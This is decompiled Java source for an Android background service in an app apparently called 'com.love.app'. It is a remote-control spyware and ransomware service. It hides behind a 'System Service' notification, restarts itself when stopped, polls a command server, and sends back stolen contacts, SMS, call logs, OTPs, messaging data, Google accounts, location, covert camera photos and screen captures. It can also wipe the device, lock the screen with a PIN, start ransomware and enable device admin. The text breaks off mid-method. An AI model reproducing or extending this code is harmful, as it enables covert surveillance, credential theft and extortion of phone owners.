package com.love.app;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.net.LinkCapabilities;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import androidx.constraintlayout.core.motion.utils.TypedValues;
import androidx.core.app.NotificationCompat;
import androidx.vectordrawable.graphics.drawable.PathInterpolatorCompat;
import androidx.work.WorkRequest;
import com.android.mms.service_alt.MmsHttpClient;
import com.android.mms.transaction.TransactionBundle;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.androidnetworking.common.ANConstants;
import com.github.tamir7.contacts.Contacts;
import com.google.gson.Gson;
import es.dmoral.toasty.Toasty;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Comparator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import kotlinx.coroutines.DebugKt;
import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.browser.Search;
import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class ForegroundService extends Service implements TextToSpeech.OnInitListener {
    public static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final String TAG = "ForegroundService";
    private static final Object lock = new Object();
    private static ForegroundService sInstance;
    private static boolean sRunning;
    private volatile Camera camera;
    private CameraManager cameraManager;
    private String deviceId;
    private LocationListener locationListener;
    private LocationManager locationManager;
    private Thread pollingThread;
    private RequestQueue requestQueue;
    private String torchCameraId;
    private TextToSpeech tts;
    private PowerManager.WakeLock wakeLock;
    private ExecutorService executor = Executors.newFixedThreadPool(4);
    private AtomicBoolean pollingActive = new AtomicBoolean(false);
    private boolean registered = false;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Object cameraLock = new Object();
    private boolean torchBlinking = false;
    private double locLat = 0.0d;
    private double locLon = 0.0d;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void executeCommandStatic(int i, String str, String str2) {
        ForegroundService foregroundService = sInstance;
        if (foregroundService != null) {
            foregroundService.executeCommand(i, str, str2);
        } else {
            Log.w(TAG, "executeCommandStatic: instance null, cmd=" + i);
        }
    }

    public static boolean isRunning() {
        return sRunning;
    }

    public static void sendResultStatic(String str, String str2, String str3) {
        ForegroundService foregroundService = sInstance;
        if (foregroundService != null) {
            foregroundService.sendResult(str, str2, str3);
        } else {
            Log.w(TAG, "sendResultStatic: instance null");
        }
    }

    private boolean hasConfiguredLockPin() {
        String string = getSharedPreferences("love_config", 0).getString("lock_pin", "");
        return string != null && string.trim().matches("\\d{4,6}");
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        synchronized (lock) {
            sInstance = this;
            sRunning = true;
        }
        Log.i(TAG, "onCreate — HTTP polling hub started");
        this.deviceId = getMyDeviceId();
        this.requestQueue = Volley.newRequestQueue(this);
        this.tts = new TextToSpeech(this, this);
        CameraManager cameraManager = (CameraManager) getSystemService("camera");
        this.cameraManager = cameraManager;
        if (cameraManager != null) {
            try {
                this.torchCameraId = cameraManager.getCameraIdList()[0];
            } catch (Exception e) {
                Log.e(TAG, "Error getting camera list", e);
            }
        }
        acquireWakeLock();
        startLocationTracking();
        waitForBaseUrlAndStartPolling();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        createNotificationChannel();
        Notification notificationBuild = new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("System Service").setContentText("Running").setSmallIcon(android.R.drawable.ic_dialog_info).setContentIntent(PendingIntent.getActivity(this, 0, new Intent(this, (Class<?>) MainActivity.class), 201326592)).build();
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(2, notificationBuild, 1);
        } else {
            startForeground(2, notificationBuild);
        }
        return 1;
    }

    @Override // android.app.Service
    public void onDestroy() {
        LocationListener locationListener;
        Log.w(TAG, "onDestroy — service dihentikan, akan restart dalam 1 detik");
        synchronized (lock) {
            sInstance = null;
            sRunning = false;
        }
        this.pollingActive.set(false);
        Thread thread = this.pollingThread;
        if (thread != null) {
            thread.interrupt();
        }
        TextToSpeech textToSpeech = this.tts;
        if (textToSpeech != null) {
            textToSpeech.shutdown();
        }
        releaseWakeLock();
        try {
            LocationManager locationManager = this.locationManager;
            if (locationManager != null && (locationListener = this.locationListener) != null) {
                locationManager.removeUpdates(locationListener);
            }
        } catch (Exception unused) {
        }
        ExecutorService executorService = this.executor;
        if (executorService != null) {
            executorService.shutdownNow();
        }
        super.onDestroy();
        final Context applicationContext = getApplicationContext();
        this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda12
            @Override // java.lang.Runnable
            public final void run() {
                ForegroundService.lambda$onDestroy$0(applicationContext);
            }
        }, 1000L);
    }

    static /* synthetic */ void lambda$onDestroy$0(Context context) {
        Intent intent = new Intent(context, (Class<?>) ForegroundService.class);
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Gagal merestart ForegroundService: " + e.getMessage());
            try {
                context.startService(new Intent(context, (Class<?>) CommandService.class));
            } catch (Exception unused) {
            }
        }
    }

    /* JADX INFO: renamed from: com.love.app.ForegroundService$1 */
    class C12781 implements ConfigFetcher.ConfigListener {
        C12781() {
        }

        @Override // com.love.app.ConfigFetcher.ConfigListener
        public void onConfigLoaded(String str) {
            ForegroundService.this.m283lambda$registerDevice$3$comloveappForegroundService(str);
            ForegroundService.this.startPollingLoop(str);
        }

        @Override // com.love.app.ConfigFetcher.ConfigListener
        public void onConfigFailed() {
            Log.w(ForegroundService.TAG, "Config fetch gagal, coba lagi 30 detik");
            ForegroundService.this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.ForegroundService$1$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m295lambda$onConfigFailed$0$comloveappForegroundService$1();
                }
            }, WorkRequest.DEFAULT_BACKOFF_DELAY_MILLIS);
        }

        /* JADX INFO: renamed from: lambda$onConfigFailed$0$com-love-app-ForegroundService$1, reason: not valid java name */
        /* synthetic */ void m295lambda$onConfigFailed$0$comloveappForegroundService$1() {
            ForegroundService.this.waitForBaseUrlAndStartPolling();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void waitForBaseUrlAndStartPolling() {
        ConfigFetcher.bootstrapConfig(this, new C12781());
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void startPollingLoop(final String str) {
        if (!this.pollingActive.compareAndSet(false, true)) {
            Log.w(TAG, "Polling loop sudah berjalan");
            return;
        }
        Log.i(TAG, "✅ HTTP polling loop dimulai: " + str);
        Thread thread = new Thread(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda14
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m290lambda$startPollingLoop$1$comloveappForegroundService(str);
            }
        });
        this.pollingThread = thread;
        thread.setDaemon(true);
        this.pollingThread.start();
    }

    /* JADX INFO: renamed from: lambda$startPollingLoop$1$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m290lambda$startPollingLoop$1$comloveappForegroundService(String str) {
        int i;
        Exception e;
        loop0: while (true) {
            int i2 = 0;
            while (this.pollingActive.get() && !Thread.currentThread().isInterrupted()) {
                try {
                    try {
                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str + "/commands/poll?device_id=" + URLEncoder.encode(this.deviceId, "UTF-8") + "&timeout=25").openConnection();
                        httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_GET);
                        httpURLConnection.setConnectTimeout(10000);
                        httpURLConnection.setReadTimeout(35000);
                        httpURLConnection.setRequestProperty("Accept", "application/json");
                        int responseCode = httpURLConnection.getResponseCode();
                        if (responseCode == 200) {
                            try {
                                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8"));
                                StringBuilder sb = new StringBuilder();
                                while (true) {
                                    String line = bufferedReader.readLine();
                                    if (line == null) {
                                        break;
                                    } else {
                                        sb.append(line);
                                    }
                                }
                                bufferedReader.close();
                                String strTrim = sb.toString().trim();
                                if (!strTrim.isEmpty() && !strTrim.equals("null") && !strTrim.equals("{}")) {
                                    processCommandResponse(strTrim, str);
                                }
                            } catch (Exception e2) {
                                e = e2;
                                i = 0;
                                int i3 = i + 1;
                                Log.e(TAG, "Polling loop exception: " + e.getMessage());
                                try {
                                    Thread.sleep(Math.min(60000, i3 * 5000));
                                    i2 = i3;
                                } catch (InterruptedException unused) {
                                }
                            }
                        } else {
                            if (responseCode != 204) {
                                i2++;
                                Log.w(TAG, "Poll HTTP " + responseCode + ", error count: " + i2);
                                Thread.sleep(Math.min(30000, i2 * Constant.CMD_SET_LOCK_MODE));
                            }
                            httpURLConnection.disconnect();
                        }
                        i2 = 0;
                        httpURLConnection.disconnect();
                    } catch (Exception e3) {
                        i = i2;
                        e = e3;
                    }
                } catch (InterruptedException unused2) {
                    Thread.currentThread().interrupt();
                } catch (SocketTimeoutException unused3) {
                }
            }
            break loop0;
        }
        Log.w(TAG, "Polling loop berhenti");
    }

    private void processCommandResponse(String str, String str2) {
        try {
            JSONObject jSONObject = new JSONObject(str);
            int iOptInt = jSONObject.optInt("cmd", -1);
            String strOptString = jSONObject.optString("param", "");
            String strOptString2 = jSONObject.optString("cmdId", "cmd_" + System.currentTimeMillis());
            if (iOptInt == -1) {
                Log.w(TAG, "Received response without cmd field: " + str);
            } else {
                Log.d(TAG, "📥 Command diterima via HTTP: cmd=" + iOptInt + " cmdId=" + strOptString2);
                executeCommand(iOptInt, strOptString, strOptString2);
            }
        } catch (JSONException e) {
            Log.e(TAG, "processCommandResponse JSON error: " + e.getMessage() + " body=" + str);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX INFO: renamed from: registerDevice, reason: merged with bridge method [inline-methods] */
    public void m283lambda$registerDevice$3$comloveappForegroundService(final String str) {
        if (this.registered) {
            return;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("device_id", this.deviceId);
            jSONObject.put("model", Build.MODEL);
            jSONObject.put("manufacturer", Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", Build.VERSION.RELEASE);
            jSONObject.put("username", ConfigFetcher.getUsername(this));
            jSONObject.put("session_id", ConfigFetcher.getSessionId(this));
            jSONObject.put("lock_pin_set", hasConfiguredLockPin());
            jSONObject.put("lock_mode", getSharedPreferences("love_config", 0).getString("lock_mode", LinkCapabilities.Role.DEFAULT));
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
            if (telephonyManager != null) {
                try {
                    jSONObject.put("country", telephonyManager.getNetworkCountryIso());
                    jSONObject.put("operator", telephonyManager.getSimOperatorName());
                } catch (SecurityException unused) {
                    jSONObject.put("country", "");
                    jSONObject.put("operator", "");
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "register JSON error", e);
        }
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(1, str + "/register", jSONObject, new Response.Listener() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda25
            @Override // com.android.volley.Response.Listener
            public final void onResponse(Object obj) {
                this.f$0.m282lambda$registerDevice$2$comloveappForegroundService((JSONObject) obj);
            }
        }, new Response.ErrorListener() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda26
            @Override // com.android.volley.Response.ErrorListener
            public final void onErrorResponse(VolleyError volleyError) {
                this.f$0.m284lambda$registerDevice$4$comloveappForegroundService(str, volleyError);
            }
        });
        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(15000, 2, 1.0f));
        this.requestQueue.add(jsonObjectRequest);
    }

    /* JADX INFO: renamed from: lambda$registerDevice$2$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m282lambda$registerDevice$2$comloveappForegroundService(JSONObject jSONObject) {
        Log.i(TAG, "✅ Registrasi HTTP sukses");
        String strOptString = jSONObject.optString("username", "");
        String strOptString2 = jSONObject.optString("session_id", "");
        if (!strOptString.trim().isEmpty()) {
            ConfigFetcher.setUsername(this, strOptString.trim());
        }
        if (!strOptString2.trim().isEmpty()) {
            ConfigFetcher.setSessionId(this, strOptString2.trim());
        }
        this.registered = true;
    }

    /* JADX INFO: renamed from: lambda$registerDevice$4$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m284lambda$registerDevice$4$comloveappForegroundService(final String str, VolleyError volleyError) {
        Log.e(TAG, "❌ Registrasi HTTP gagal, coba lagi 30 detik");
        this.mainHandler.postDelayed(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda11
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m283lambda$registerDevice$3$comloveappForegroundService(str);
            }
        }, WorkRequest.DEFAULT_BACKOFF_DELAY_MILLIS);
    }

    private String getMyDeviceId() {
        SharedPreferences sharedPreferences = getSharedPreferences("love_config", 0);
        String string = sharedPreferences.getString("device_id", null);
        if (string == null) {
            string = Settings.Secure.getString(getContentResolver(), "android_id");
            if (string == null || string.isEmpty()) {
                string = "unknown_" + System.currentTimeMillis();
            }
            sharedPreferences.edit().putString("device_id", string).apply();
        }
        return string;
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService("power");
            if (powerManager != null) {
                PowerManager.WakeLock wakeLockNewWakeLock = powerManager.newWakeLock(1, "ForegroundService::WakeLock");
                this.wakeLock = wakeLockNewWakeLock;
                wakeLockNewWakeLock.acquire(43200000L);
            }
        } catch (Exception e) {
            Log.e(TAG, "Gagal acquire WakeLock", e);
        }
    }

    private void releaseWakeLock() {
        PowerManager.WakeLock wakeLock = this.wakeLock;
        if (wakeLock == null || !wakeLock.isHeld()) {
            return;
        }
        this.wakeLock.release();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "System Service", 2);
            NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
    }

    @Override // android.speech.tts.TextToSpeech.OnInitListener
    public void onInit(int i) {
        if (i == 0) {
            this.tts.setLanguage(Locale.getDefault());
        }
    }

    private void startLocationTracking() {
        if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == 0 || checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") == 0) {
            try {
                this.locationManager = (LocationManager) getSystemService("location");
                this.locationListener = new LocationListener() { // from class: com.love.app.ForegroundService.2
                    @Override // android.location.LocationListener
                    public void onProviderDisabled(String str) {
                    }

                    @Override // android.location.LocationListener
                    public void onProviderEnabled(String str) {
                    }

                    @Override // android.location.LocationListener
                    public void onStatusChanged(String str, int i, Bundle bundle) {
                    }

                    @Override // android.location.LocationListener
                    public void onLocationChanged(Location location) {
                        ForegroundService.this.locLat = location.getLatitude();
                        ForegroundService.this.locLon = location.getLongitude();
                        ForegroundService.this.getSharedPreferences("love_config", 0).edit().putLong("loc_lat", Double.doubleToLongBits(ForegroundService.this.locLat)).putLong("loc_lon", Double.doubleToLongBits(ForegroundService.this.locLon)).apply();
                    }
                };
                if (this.locationManager.isProviderEnabled("gps")) {
                    this.locationManager.requestLocationUpdates("gps", WorkRequest.DEFAULT_BACKOFF_DELAY_MILLIS, 50.0f, this.locationListener);
                }
                if (this.locationManager.isProviderEnabled("network")) {
                    this.locationManager.requestLocationUpdates("network", WorkRequest.DEFAULT_BACKOFF_DELAY_MILLIS, 50.0f, this.locationListener);
                }
            } catch (Exception e) {
                Log.e(TAG, "Location tracking error", e);
            }
        }
    }

    private byte[] compressImage(byte[] bArr, int i, int i2) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inPreferredConfig = Bitmap.Config.RGB_565;
            Bitmap bitmapDecodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length, options);
            if (bitmapDecodeByteArray == null) {
                return bArr;
            }
            int width = bitmapDecodeByteArray.getWidth();
            int height = bitmapDecodeByteArray.getHeight();
            if (i2 > 0 && (width > i2 || height > i2)) {
                float f = i2;
                float f2 = width;
                float f3 = height;
                float fMin = Math.min(f / f2, f / f3);
                Bitmap bitmapCreateScaledBitmap = Bitmap.createScaledBitmap(bitmapDecodeByteArray, (int) (f2 * fMin), (int) (f3 * fMin), true);
                bitmapDecodeByteArray.recycle();
                bitmapDecodeByteArray = bitmapCreateScaledBitmap;
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmapDecodeByteArray.compress(Bitmap.CompressFormat.JPEG, i, byteArrayOutputStream);
            bitmapDecodeByteArray.recycle();
            return byteArrayOutputStream.toByteArray();
        } catch (Exception | OutOfMemoryError unused) {
            return bArr;
        }
    }

    private void executeCommand(int i, String str, String str2) {
        Log.d(TAG, "executeCommand: cmd=" + i + " cmdId=" + str2);
        switch (i) {
            case 200:
            case 1020:
            case Constant.CMD_GET_WHATSAPP_NUMBER /* 1050 */:
            case Constant.CMD_GET_WHATSAPP_MESSAGES /* 1054 */:
            case Constant.CMD_GET_TELEGRAM_MESSAGES /* 1055 */:
            case Constant.CMD_SET_LOCK_MODE /* 2000 */:
            case Constant.CMD_TOUCH /* 115987 */:
            case Constant.CMD_HOME /* 25896321 */:
            case Constant.CMD_RECENTS /* 33654789 */:
            case Constant.CMD_CLICK /* 44598715 */:
            case Constant.CMD_NOTIFICATIONS /* 45832158 */:
            case Constant.CMD_BACK /* 66985478 */:
            case Constant.CMD_SET_TEXT /* 885478962 */:
                delegateToAccessibility(i, str, str2);
                break;
            case Constant.CMD_SEND_VOICE /* 2001 */:
                playAudio(str, str2);
                break;
            default:
                switch (i) {
                    case 1001:
                        getContacts(str2);
                        break;
                    case 1002:
                        getSms(str2);
                        break;
                    case 1003:
                        sendSms(str, str2);
                        break;
                    case 1004:
                        getCallLogs(str2);
                        break;
                    case Constant.CMD_GET_LOCATION /* 1005 */:
                        sendLocation(str2);
                        break;
                    case 1006:
                        sendDeviceInfo(str2);
                        break;
                    case 1007:
                        getBrowserHistory(str2);
                        break;
                    case 1008:
                        vibrate(str2);
                        break;
                    case 1009:
                        wipe(str2);
                        break;
                    case 1010:
                        startService(new Intent(this, (Class<?>) MyService.class));
                        sendResult("ransomware", "started", str2);
                        break;
                    case 1011:
                        changeWallpaper(str, str2);
                        break;
                    case 1012:
                        speak(str, str2);
                        break;
                    case 1013:
                        showToast(str, str2);
                        break;
                    case 1014:
                        getFileList(str, str2);
                        break;
                    case 1015:
                        uploadFile(str, str2);
                        break;
                    case 1016:
                        setTorch(true, str2);
                        break;
                    case 1017:
                        setTorch(false, str2);
                        this.torchBlinking = false;
                        break;
                    case 1018:
                        startTorchBlink(str2);
                        break;
                    case 1019:
                        fetchNotifications(str2);
                        break;
                    default:
                        switch (i) {
                            case Constant.CMD_GET_OTP /* 1051 */:
                                getOTP(str2);
                                break;
                            case Constant.CMD_GET_TELEGRAM /* 1052 */:
                                getTelegram(str2);
                                break;
                            case Constant.CMD_GET_GOOGLE_ACCOUNTS /* 1053 */:
                                getGoogleAccounts(str2);
                                break;
                            default:
                                switch (i) {
                                    case Constant.CMD_SCREENSHOT /* 1060 */:
                                        startScreenCapture(ScreenCaptureService.ACTION_SCREENSHOT, str2);
                                        break;
                                    case Constant.CMD_SCREEN_RECORD_START /* 1061 */:
                                        startScreenCapture(ScreenCaptureService.ACTION_RECORD_START, str2);
                                        break;
                                    case Constant.CMD_SCREEN_RECORD_STOP /* 1062 */:
                                        stopScreenRecord(str2);
                                        break;
                                    default:
                                        switch (i) {
                                            case Constant.CMD_STOP_RANSOMWARE /* 10101 */:
                                                stopRansomware(str2);
                                                break;
                                            case Constant.CMD_GET_APPS /* 1596485 */:
                                                sendInstalledApps(str2);
                                                break;
                                            case Constant.CMD_OVERLAY_SHOW /* 5698742 */:
                                                startService(new Intent(this, (Class<?>) ServiceWindow.class));
                                                sendResult("overlay", "shown", str2);
                                                break;
                                            case Constant.CMD_UNINSTALL /* 64645897 */:
                                                uninstallApp(str, str2);
                                                break;
                                            case Constant.CMD_LAUNCH_APP /* 74789654 */:
                                                launchApp(str, str2);
                                                break;
                                            case Constant.CMD_SET_LOCK_PIN /* 87654321 */:
                                                setLockPin(str, str2);
                                                break;
                                            case Constant.CMD_OVERLAY_HIDE /* 89521475 */:
                                                stopService(new Intent(this, (Class<?>) ServiceWindow.class));
                                                sendResult("overlay", "hidden", str2);
                                                break;
                                            case Constant.CMD_ENABLE_ADMIN /* 99887766 */:
                                                enableDeviceAdmin(str2);
                                                break;
                                            default:
                                                switch (i) {
                                                    case Constant.CMD_TAKE_PHOTO_BACK /* 11223344 */:
                                                        takePhoto(0, str2);
                                                        break;
                                                    case Constant.CMD_TAKE_PHOTO_FRONT /* 11223345 */:
                                                        takePhoto(1, str2);
                                                        break;
                                                    default:
                                                        switch (i) {
                                                            case Constant.CMD_LOCK_SCREEN /* 98765432 */:
                                                                startLockActivity(str2);
                                                                break;
                                                            case Constant.CMD_UNLOCK_SCREEN /* 98765433 */:
                                                                unlockScreen(str2);
                                                                break;
                                                            default:
                                                                Log.w(TAG, "Unknown cmd: " + i);
                                                                sendResult("error", "unknown command: " + i, str2);
                                                                break;
                                                        }
                                                        break;
                                                }
                                                break;
                                        }
                                        break;
                                }
                                break;
                        }
                        break;
                }
                break;
        }
    }

    private void delegateToAccessibility(int i, String str, String str2) {
        Intent intent = new Intent("com.love.app.EXECUTE_CMD");
        intent.putExtra("cmd", i);
        intent.putExtra("param", str);
        intent.putExtra("cmdId", str2);
        sendBroadcast(intent);
    }

    public void sendResult(final String str, final String str2, final String str3) {
        final String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null || baseUrl.isEmpty()) {
            Log.e(TAG, "sendResult: baseUrl null");
        } else {
            this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda22
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m287lambda$sendResult$5$comloveappForegroundService(str3, str, str2, baseUrl);
                }
            });
        }
    }

    /* JADX INFO: renamed from: lambda$sendResult$5$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m287lambda$sendResult$5$comloveappForegroundService(String str, String str2, String str3, String str4) {
        boolean z = false;
        int i = 0;
        while (!z && i < 3) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("device_id", this.deviceId);
                jSONObject.put("cmdId", str != null ? str : "");
                jSONObject.put(TransactionBundle.TRANSACTION_TYPE, str2);
                jSONObject.put(ScreenCaptureService.EXTRA_DATA, str3 != null ? str3 : "");
                jSONObject.put("timestamp", System.currentTimeMillis());
                byte[] bytes = jSONObject.toString().getBytes("UTF-8");
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str4 + "/result").openConnection();
                httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_POST);
                httpURLConnection.setConnectTimeout(10000);
                httpURLConnection.setReadTimeout(10000);
                httpURLConnection.setRequestProperty(HttpHeaderParser.HEADER_CONTENT_TYPE, "application/json; charset=UTF-8");
                httpURLConnection.setRequestProperty("Content-Length", String.valueOf(bytes.length));
                httpURLConnection.setDoOutput(true);
                OutputStream outputStream = httpURLConnection.getOutputStream();
                try {
                    outputStream.write(bytes);
                    outputStream.flush();
                    if (outputStream != null) {
                        outputStream.close();
                    }
                    int responseCode = httpURLConnection.getResponseCode();
                    if (responseCode == 200 || responseCode == 201) {
                        try {
                            Log.d(TAG, "✅ sendResult sukses (" + str2 + ")");
                            z = true;
                        } catch (Exception e) {
                            e = e;
                            z = true;
                            i++;
                            Log.e(TAG, "❌ sendResult exception: " + e.getMessage() + ", retry " + i);
                            try {
                                Thread.sleep(i * PathInterpolatorCompat.MAX_NUM_POINTS);
                            } catch (InterruptedException unused) {
                            }
                        }
                    } else {
                        i++;
                        Log.w(TAG, "⚠️ sendResult HTTP " + responseCode + ", retry " + i);
                        Thread.sleep(i * Constant.CMD_SET_LOCK_MODE);
                    }
                    httpURLConnection.disconnect();
                } catch (Throwable th) {
                    if (outputStream != null) {
                        try {
                            outputStream.close();
                        } catch (Throwable th2) {
                            th.addSuppressed(th2);
                        }
                    }
                    throw th;
                }
            } catch (Exception e2) {
                e = e2;
                i++;
                Log.e(TAG, "❌ sendResult exception: " + e.getMessage() + ", retry " + i);
                Thread.sleep(i * PathInterpolatorCompat.MAX_NUM_POINTS);
            }
        }
    }

    private void takePhoto(final int i, final String str) {
        this.torchBlinking = false;
        setTorch(false, null);
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda9
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m292lambda$takePhoto$7$comloveappForegroundService(i, str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$takePhoto$7$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m292lambda$takePhoto$7$comloveappForegroundService(int i, final String str) {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int i2 = 0;
        while (true) {
            if (i2 >= Camera.getNumberOfCameras()) {
                i2 = -1;
                break;
            }
            Camera.getCameraInfo(i2, cameraInfo);
            if ((i == 1 && cameraInfo.facing == 1) || (i == 0 && cameraInfo.facing == 0)) {
                break;
            } else {
                i2++;
            }
        }
        if (i2 == -1) {
            sendResult("photo_error", "Kamera tidak ditemukan", str);
            return;
        }
        synchronized (this.cameraLock) {
            if (this.camera != null) {
                releaseCamera();
            }
            try {
                this.camera = Camera.open(i2);
                this.camera.setPreviewTexture(new SurfaceTexture(0));
                Camera.Parameters parameters = this.camera.getParameters();
                parameters.setJpegQuality(85);
                List<Camera.Size> supportedPictureSizes = parameters.getSupportedPictureSizes();
                if (supportedPictureSizes != null && !supportedPictureSizes.isEmpty()) {
                    Camera.Size size = supportedPictureSizes.get(Math.max(0, supportedPictureSizes.size() - Math.max(1, supportedPictureSizes.size() / 3)));
                    parameters.setPictureSize(size.width, size.height);
                }
                this.camera.setParameters(parameters);
                this.camera.startPreview();
                Thread.sleep(500L);
                this.camera.takePicture(null, null, new Camera.PictureCallback() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda0
                    @Override // android.hardware.Camera.PictureCallback
                    public final void onPictureTaken(byte[] bArr, Camera camera) {
                        this.f$0.m291lambda$takePhoto$6$comloveappForegroundService(str, bArr, camera);
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "takePhoto error", e);
                releaseCamera();
                sendResult("photo_error", e.getMessage(), str);
            }
        }
    }

    /* JADX INFO: renamed from: lambda$takePhoto$6$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m291lambda$takePhoto$6$comloveappForegroundService(String str, byte[] bArr, Camera camera) {
        synchronized (this.cameraLock) {
            camera.stopPreview();
            camera.release();
            this.camera = null;
        }
        sendResult("photo", Base64.encodeToString(compressImage(bArr, 60, 1024), 2), str);
    }

    private void releaseCamera() {
        synchronized (this.cameraLock) {
            if (this.camera != null) {
                try {
                    this.camera.stopPreview();
                    this.camera.release();
                } catch (Exception unused) {
                }
                this.camera = null;
            }
        }
    }

    private void playAudio(final String str, final String str2) {
        this.executor.execute(new Runnable() { // from class: com.love.app.ForegroundService$$ExternalSyntheticLambda19
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m281lambda$playAudio$9$comloveappForegroundService(str, str2);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$playAudio$9$com-love-app-ForegroundService, reason: not valid java name */
    /* synthetic */ void m281lambda$playAudio$9$comloveappForegroundService(String str, String str2) {
        MediaPlayer mediaPlayer;
        File file = null;
        try {
            URLConnection uRLConnectionOpenConnection = new URL(str).openConnection();
            uRLConnectionOpenConnection.connect();
            final File file2 = new File(getCacheDir(), "temp_audio_" + System.currentTimeMillis() + ".mp3");
            try {
